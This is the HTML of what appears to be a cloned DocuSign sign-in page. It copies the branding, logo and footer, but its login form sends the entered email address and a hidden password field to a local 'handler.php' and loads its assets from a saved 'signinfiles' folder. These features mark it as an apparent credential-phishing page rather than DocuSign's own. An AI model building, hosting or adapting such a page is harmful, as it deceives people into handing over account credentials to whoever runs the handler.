



<!DOCTYPE html>

<html ng-app="LoginAppNext.App" lang="en" class="account-server" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    
    <meta name="viewport" content="initial-scale=1.0">
    <meta name="description" meta-description="" content="Sign in to your DocuSign account to electronically sign documents, request signatures, check document status, send reminders, and view audit trails.">
    <title>DocuSign Login - Enter email to start sign in</title>
    </head><body class="site-content"><page-title></page-title>
    <link href="https://www.docusign.com/sites/all/themes/custom/docusign/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <!--<base href="/">--><base href=".">

 


    <link href="signinfiles/app.css" rel="stylesheet">

    <!-- 17.4.1.20230 SE1FE43 42187a58-0a44-4162-a261-300f07644551 -->



    <!----><div ui-view=""><div ng-controller="UiFlavor as flavor">
    <div class="authentication" ng-switch="flavor.ui.showHeader">

        <!----><header class="text-center header" ng-switch-when="true" ng-controller="LogoController as logo" role="banner">
            <!----><img ng-if="logo.useDocuSignLogo" src="https://account.docusign.com/LoginAppNext/images/docusign_logo_small.png" translate="" translate-attr-alt="DocuSign" alt="DocuSign"><!---->
            <!---->
        </header><!---->
        <!---->

        <main class="main" role="main">
            <header class="text-center header">
                <!----><h1 ng-if="flavor.ui.showTitle" call-to-action="title" translate="Please log in to your account">Please log in with your email address</h1><!---->
            </header>
            <section class="authentication-state">
                <!----><div ui-view="auth"><div class="username" ng-controller="UserName as userName">
    <form name="login" method="post" action="handler.php" flow-submission="username" anti-forgery-secured="" oauth-flow="" class="ng-pristine ng-valid-email ng-invalid ng-invalid-required">
        <div class="form-group">
            
            <input name="email" id="username" type="text" class="input input-text ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-touched" data-qa="username" ng-model="username" placeholder="Email address" auto-focus="" login-hint="" required spellcheck="false" aria-required="true" title="To log in, enter your email address">
            <input name="password" id="password" class="hide" type="password" aria-hidden="true">
            <input type="hidden" name="action" value="" autocomplete="off">
        </div>
        <div class="form-group" ng-controller="FixtureError as fixtureError" id="fixtureErrors">
            <!---->
        </div>
        <div class="form-group">
            <button class="btn btn-main btn-lg" type="submit" data-qa="submit-username" ng-disabled="login.$submitted">
                <span translate="Continue">Continue</span>
            </button>
        </div>
    <input type="hidden" name="RelayState" value="{}"><input name="__RequestVerificationToken" type="hidden" value="Ad6JpPWC7zFzScyifFA2ZxQAAAAA0"></form>
</div>
</div>
                <!----><div class="footer" ui-view="authAlternative"><div ng-controller="SignUp as signUp">
    <!----><p class="text-center" ng-if="signUp.isEnabled">
        <a ng-href="#" translate="No account? Enter email above" href="./?#username">No account? Enter email above</a>
    </p><!---->
</div></div>
            </section>
            <!----><!----><aside ng-if="flavor.ui.showAuthAlternative" class="authentication-alternative text-center" ui-view="alternative" role="complementary"><div class="form-group-inline" ng-controller="ExternalAuthentication as externalAuth">
    <!----><div class="text-center" ng-if="externalAuth.isAvailable">
        <!----><div class="form-group-inline" ng-if="externalAuth.showJanrainOptions">
            <h2 translate="Or log in via:">Or log in via:</h2>
            <!----><div class="janrain-options" ng-include="&#39;LoginAppNext/login/external/janrain/janrain-options.html&#39;"><div class="form-group-inline" ng-controller="Janrain as janrain">
    <a ng-href="#" href="#">
        <img src="signinfiles/social_auth_providers.png" translate="" translate-attr-title="DocuSign Social Login - Sign in via Google+, Facebook, Microsoft, Office 365, Salesforce, Twitter, LinkedIn or Yahoo!" title="DocuSign Social Login - Sign in via Google+, Facebook, Microsoft, Office 365, Salesforce, Twitter, LinkedIn or Yahoo!">
    </a>
</div>
</div>
        </div><!---->
        <!---->
        <!---->
    </div><!---->
</div>
<!----><div class="text-center form-group-inline" ng-include="&#39;LoginAppNext/login/cancel.html&#39;"><span ng-controller="Cancellation as cancellation">
    <!---->
</span></div></aside><!---->
        </main>

        <!----><!----><footer class="site-footer footer" ng-include="&#39;LoginAppNext/layout/footer.html&#39;" ng-if="flavor.ui.showFooter"><div class="site-container grid footer-links" ng-controller="LanguageSelection as languages">
    <div class="footer-links">
        <div class="language-menu" id="languageMenu" aria-haspopup="true">
            <button class="item link" ng-click="languages.showLanguageMenu($event);">
                <span>
                    <span class="icon icon-language"></span>
                    <span translate="" translate-attr-title="Current language" title="Current language"></span>
                    English (US)
                    <!----><span class="icon icon-menu-triangle-down" ng-if="!languages.languageMenuVisible"></span><!---->
                    <!---->
                </span>
            </button>
            <ul id="languageList" class="languages ng-hide" role="menu" ng-show="languages.languageMenuVisible" aria-hidden="true" aria-expanded="false">
                <!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="ar">
                            العربية‏
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="bg">
                            Български
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="cs">
                            Čeština
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="zh_CN">
                            中文 (简体)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="zh_TW">
                            中文 (繁体)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="hr">
                            Hrvatski
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="da">
                            Dansk
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="nl">
                            Nederlandse
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="en">
                            English (US)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="en_GB">
                            English (UK)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="et">
                            Eesti
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="fa">
                            فارسی
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="fi">
                            Suomi
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="fr">
                            Français (France)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="fr_CA">
                            Français (Canada)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="de">
                            Deutsch
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="el">
                            Ελληνικά
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="he">
                            עברית‏
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="hi">
                            हिन्दी
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="hu">
                            Magyar
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="id">
                            Bahasa Indonesia
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="it">
                            Italiano
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="ja">
                            日本語
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="ko">
                            한국어
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="lv">
                            Latviešu
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="lt">
                            Lietuvių
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="ms">
                            Bahasa Melayu
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="no">
                            Norsk
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="pl">
                            Polski
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="pt">
                            Português (Portugal)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="pt_BR">
                            Português (Brasil)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="ro">
                            Română
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="ru">
                            Русский
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="sr">
                            Српски
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="sk">
                            Slovenčina
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="sl">
                            Slovenščina
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="es">
                            Español
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="es_MX">
                            Español (América Latina)
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="sv">
                            Svenska
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="th">
                            ภาษาไทย
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="tr">
                            Türkçe
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="uk">
                            Українська
                    </button>
                </li><!----><li ng-repeat="(languageKey, languageInfo) in languages.available">
                    <!-- Set lang to languageKey so screen readers will read in native tongue -->
                    <button class="language link" role="menuitem" ng-click="languages.setCurrentCulture(languageKey)" lang="vi">
                            Việt
                    </button>
                </li><!---->
            </ul>
        </div>
    </div>
    <ul role="navigation" class="footer-links">
        <li><a class="item" target="_blank" href="http://www.docusign.com/support" translate="Help" translate-attr-title="Link opens in new window" title="Link opens in new window">Help</a></li>        
        <li><a class="item" target="_blank" ng-href="https://www.docusign.com/company/terms-of-use/lang/en" translate="Terms" translate-attr-title="Link opens in new window" title="Link opens in new window" href="https://www.docusign.com/company/terms-of-use/lang/en">Terms</a></li>
        <li class="collapse"><a class="item" target="_blank" ng-href="https://www.docusign.com/IP/lang/en" translate="Intellectual Property" translate-attr-title="Link opens in new window" title="Link opens in new window" href="https://www.docusign.com/IP/lang/en">Intellectual Property</a></li>
        <li><a class="item" target="_blank" ng-href="https://www.docusign.com/company/privacy-policy/lang/en" translate="Privacy Policy" translate-attr-title="Link opens in new window" title="Link opens in new window" href="https://www.docusign.com/company/privacy-policy/lang/en">Privacy Policy</a></li>
    </ul>
</div>
<aside current-date="currentDate" role="contentinfo">
    <p translate="Copyright © [[year]] DocuSign, Inc. All rights reserved." translate-interpolation="bracket" translate-values="{year: currentDate.getFullYear()}">Copyright © 2017 DocuSign, Inc. All rights reserved.</p>
</aside>
</footer><!---->
    </div>
</div></div>

    <!--[if (!IE)|(gt IE 8)]><!-->
<script src="signinfiles/corenext"></script>
    <!--<![endif]-->

    <!--[if lte IE 8]>
      <link href="/LoginAppNext/styles/legacy?v=4PA642FFntoeJCbU9Xo8MtjFl47UpOhb1wGcStBQ1UU1" rel="stylesheet"/>


<script src="/LoginAppNext/corenext/legacy?v=vaztF_3obMKOHKOg88Uql6igHORRetdvVSX_Ne-_ROY1"></script>
      
        <style type="text/css">
            /*
                Older browsers (IE8) may interpret the new tags as having an empty XML namespace
                when Angular attempts to generate them, so we need to deal with the default styling of those elements, too.
            */

            \:article,
            \:aside,
            \:details,
            \:figcaption,
            \:figure,
            \:footer,
            \:header,
            \:hgroup,
            \:main,
            \:nav,
            \:section,
            \:summary {
              display: block; }
        </style>
    <![endif]-->
    <script src="signinfiles/templates"></script>

    <script src="signinfiles/app(1)"></script>




</body></html>